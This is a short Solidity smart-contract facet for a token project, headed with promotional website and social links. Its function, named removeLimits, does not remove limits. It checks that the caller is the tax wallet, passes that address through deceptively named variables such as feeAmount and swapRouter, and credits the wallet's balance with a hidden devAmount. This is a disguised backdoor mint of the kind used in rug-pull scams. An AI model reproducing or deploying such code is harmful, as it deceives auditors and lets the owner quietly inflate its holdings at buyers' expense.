// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://thenextgem.ai/
    Twitter:  https://twitter.com/NextGemAI
    Discord:  https://discord.gg/rpPTF3DRFk
    Telegram: https://t.me/NextGemAI_Group

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
